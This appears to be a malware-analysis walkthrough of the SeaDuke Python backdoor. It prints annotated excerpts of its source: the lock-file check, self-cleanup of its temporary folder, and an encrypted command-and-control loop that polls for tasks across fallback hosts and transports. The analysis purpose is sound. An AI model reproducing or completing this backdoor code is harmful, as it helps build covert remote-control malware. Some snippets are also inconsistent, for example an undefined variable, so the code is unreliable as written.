# what happens when you execute?
```python
if __name__=="__main__":
    time_sleep(botKlass.run_delay)
    if not botKlass.was_first_run:
        botKlass.was_first_run=True
    if v_sys_platform!='win32':
        forkmeiamfamous()
    me=BotInstallKlass(botKlass.key_id)

    try:
        seh_wrapper()
    except SystemExit:
        me=None
        time_sleep(1)
        sys_exit(0)
    except Exception as e:
        me=None
        time_sleep(1)
        sys_exit(0)
```
## `BotInstallKlass` installs `botklass` object
a `botKlass` instance was created earlier and it is called `botKlass`. it is immediately installed by `BotInstallKlass`.
```python
class BotKlass(object):
    ...

botKlass=BotKlass()

if __name__=="__main__":
    ...
    me=BotInstallKlass(botKlass.key_id)
```
`BotInstallKlass` takes the `key_id` from botKlass object and uses it as a filename:
```python
class BotInstallKlass(object):

    def __init__(self,*key_id):
    pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDie=key_id[0]
    ...
        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyQzei='tmp'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyzDie.lower()
    ...
    self.lockfile=os_path.normpath(tempfile_gettempdir()+'/'+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTyQzei)
```
`BotInstallKlass` then locks that file with `fcntl`, thus preventing it from being modified by other processes.
```python
class BotInstallKlass(object):

    def __init__(self,*key_id):
        ...
        if self.platform=='win32':
            ...
        else:
            self.fp=open(self.lockfile,'w')
            try:
                fcntl.lockf(self.fp,fcntl.LOCK_EX|fcntl.LOCK_NB)  # http://tilde.town/~cristo/file-locking-in-python.html
```

## doing seh_wrapper()
```python
def seh_wrapper():
    if botKlass.frozen:
        # _MEIPASS is the partial foldername where Python libraries are stored.
        # Cleaning up these directories to remove any remnants.
        attr__MEIPASS=getattr(sys,'_MEIPASS', None)
        botKlass.add_cleanup_dir(attr__MEIPASS)
        botKlass.do_cleanup_dirs()
    if botKlass.enable_autoload and not botKlass.autoload_registered:
        botActionKlass=BotSelfActionsKlass()
        botActionKlass.register()
    try:
        main()
    except KeyboardInterrupt as ki:
        sys_exit(0)
```
### first, it cleans up after itself
seaduke finds the temporary folder used by pysinstaller.
```python
attr__MEIPASS=getattr(sys,'_MEIPASS', None)  # https://stackoverflow.com/questions/22472124/what-is-sys-meipass-in-python
```
it then cleans up after itself with:
```python
def seh_wrapper():
    if botKlass.frozen:
        ...
        botKlass.add_cleanup_dir(attr__MEIPASS)
        botKlass.do_cleanup_dirs()
```
finally, it calls `main()`.

## main()
```python
def main():
    threadStuffKlass=DoingThreadStuffKlass()
    networkHandleKlass=NetworkHandlerKlass()
    while 1:
        gc_collect() # Garbage collector
        pass
        networkTasks=networkHandleKlass.get_tasks()
        pass
        if networkTasks:
            for networkTask in networkTasks:
                taskID=networkTask.get('task_id',None)
                taskData=networkTask.get('task_data',None)
                if taskID and taskData:
                    if not threadStuffKlass.have_task(taskID):
                        try:
                            threadStuffKlass.put(taskID,taskData)
                            botKlass.reset_tick_count()
                        except KeyboardInterrupt as ki:
                            time_sleep(5)
                            sys_exit(0)
                        except Exception as e:
                            pass
            time_sleep(random_randint(3,7))
        else:
            time_sleep(random_randint(*botKlass.update_interval))
            botKlass.tick_count+=1
```
### instantiate threads and network handler
first, we instantiate a `DoingThreadStuffKlass` object and a `NetworkHandlerKlass` object.
```python
def main():
    threadStuffKlass=DoingThreadStuffKlass()


class DoingThreadStuffKlass(object):
    def __init__(self):
        self.threads={}


class NetworkHandlerKlass(object):
    def __init__(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
        self.__url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('url',None)
        self.user_agent=botKlass.user_agent
```
### fetching tasks with networkhandler
then we ask `networkHandleKlass` to get tasks:
```python
def main():
    ...
    while 1:
        ...
        networkTasks=networkHandleKlass.get_tasks()


class NetworkHandlerKlass(object):

    def get_tasks(self):
        networkTasks=[]
        my_cryptoklass=CryptoKlass(botKlass.get_key('aes'), botKlass.get_key('aes_iv'))
        for h in range(botKlass.total_hosts):
            for t in range(botKlass.total_transports):
                for _ in range(3):
                    networkTasks=[]
                    try:
                        response_data=self.__send_request(id=botKlass.bot_id)
                        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy=self.decode_data(response_data)
                        if not 'tasks' in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy:
                            return[]
                        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy['tasks']
                        for networkTask in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD:
                            if 'task_data' in networkTask and networkTask['task_data']:
                                networkTask['task_data']=my_cryptoklass.decode_data(networkTask['task_data'])
                                networkTasks.append(networkTask)
                        botKlass.is_first_request=False
                        return networkTasks
                    except ExceptionKlass:
                        pass
                        time_sleep(random_randint(3,8))
                        continue
                    except(urllib2_httperror,ValueError,TypeError)as error:
                        time_sleep(3)
                        pass
                    except urllib2_urlerror as error:
                        pass
                        time_sleep(5)
                    except Exception as e:
                        pass
                        time_sleep(10)
                botKlass.change_transport()
            botKlass.change_host()
        return networkTasks
```
this instantiates a `CryptoKlass` object called `pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy`.
```python
class CryptoKlass(object):

    def __init__(self,v_crypto_aes_key,v_crypto_aes_iv,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
        if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('b64',True):
            v_crypto_aes_key=base64_b64decode(v_crypto_aes_key)
            v_crypto_aes_iv=base64_b64decode(v_crypto_aes_iv)
        self.__aes_key=v_crypto_aes_key
        self.__aes_iv=v_crypto_aes_iv
```
it then does three inner loops:
```python
class NetworkHandlerKlass(object):

    def get_tasks(self):
        ...
        for _ in range(botKlass.total_hosts):
            for _ in range(botKlass.total_transports):
                for _ in range(3):
                    networkTasks=[]
                    try:
                        response_data=self.__send_request(id=botKlass.bot_id)
                        decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response
                        if not 'tasks' in decoded_response:
                            return []
                        decoded_tasks = decoded_data['tasks']  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD renamed to decoded_tasks
                        for networkTask in decoded_tasks:
                            if 'task_data' in networkTask and networkTask['task_data']:
                                networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
                                networkTasks.append(networkTask)
                        botKlass.is_first_request=False
                        return networkTasks
```
first the networkhandler gets instructions with `NetworkHandlerKlass.__send_request` method:
```python
response_data=self.__send_request(id=botKlass.bot_id)

class BotKlass(object):

    def __init__(self):
        self.__settings=self.__load_settings()
        ...
        self.__bot_id=self.__settings['bot_id']


class NetworkHandlerKlass(object):
    ...
    def __send_request(self, **x):
        url = x.pop('url', self.url)
        encoded_cookie_data = None
        res= None
        
        if x:
            encoded_cookie_data=self.__encode_cookie(x)
        
        if botKlass.current_transport=='wininet':
            pass
            p = HttpKlass(url,self.user_agent)
            res = p.send_request(encoded_cookie_data, self.referer)
        else:
            pass
            
            header = urllib2_build_opener()
            header.addheaders=[('User-agent',self.user_agent)]
            
            if encoded_cookie_data:
                header.addheaders.append(('Cookie',encoded_cookie_data))
            
            if self.referer:
                pass

            d = header.open(url)
            res = d.read()
            e = d.info().get('Content-Encoding')
            if e:
                res = CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,e)
        return res
```

then it decodes tasks
```python
decoded_response = self.decode_data(response_data)
```
then, only if it receives tasks from at least one instruction will it view it as an official task:
```python
for networkTask in decoded_tasks:
    if 'task_data' in networkTask and networkTask['task_data']:
        networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
        networkTasks.append(networkTask)
```